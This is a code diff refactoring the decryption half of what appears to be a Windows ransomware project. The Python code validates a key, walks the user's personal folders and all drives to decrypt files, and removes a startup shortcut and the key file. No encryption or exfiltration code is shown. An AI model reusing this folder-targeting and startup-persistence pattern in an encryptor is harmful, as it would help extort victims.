@@ -52,8 +52,8 @@ except KeyboardInterrupt:
 
 
 def is_valid_key(key):
+    key_file = os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256")
     try:
-        key_file = os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256")
         if magic != b"DCRY+DKEY$":
             return False
         if not key or len(key) != 32 or not os.path.exists(key_file):
@@ -65,25 +65,23 @@ def is_valid_key(key):
 
 
 def start_decryption():
+    target_dirs = [
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Desktop"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"),
+        os.path.join(rf"C:\Users\{getpass.getuser()}", "Music"),
+    ]
+    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
     if not is_valid_key(key):
         print(f"\n{Fore.LIGHTRED_EX}Invalid key")
         input("Press enter to exit...")
         sys.exit(2)
     if not dev_mode:
-        decrypt_directory(
-            os.path.join(rf"C:\Users\{getpass.getuser()}", "Desktop"), key
-        )
-        decrypt_directory(
-            os.path.join(rf"C:\Users\{getpass.getuser()}", "Downloads"), key
-        )
-        decrypt_directory(
-            os.path.join(rf"C:\Users\{getpass.getuser()}", "Documents"), key
-        )
-        decrypt_directory(
-            os.path.join(rf"C:\Users\{getpass.getuser()}", "Pictures"), key
-        )
-        decrypt_directory(os.path.join(rf"C:\Users\{getpass.getuser()}", "Videos"), key)
-        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
+        for dir in target_dirs:
+            if os.path.exists(dir):
+                decrypt_directory(dir, key)
         for disk in [
             f"{letter}:\\"
             for i, letter in enumerate(string.ascii_uppercase)
@@ -112,24 +110,20 @@ def decrypt_directory(directory_path, key):
             future.result()
 
 
-def main():
+dev_mode = True
+if __name__ == "__main__":
     start_decryption()
     startup = winshell.startup()
+    key_path = os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256")
+    shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
     if not dev_mode:
-        shortcut_path = os.path.join(startup, "OpenFileAtStartup.lnk")
         if os.path.exists(shortcut_path):
             try:
                 os.remove(shortcut_path)
             except:
                 pass
-    key_path = os.path.join(rf"C:\Users\{getpass.getuser()}", "key.sha256")
     if os.path.exists(key_path):
         try:
             os.remove(key_path)
         except:
             pass
-
-
-dev_mode = True
-if __name__ == "__main__":
-    main()
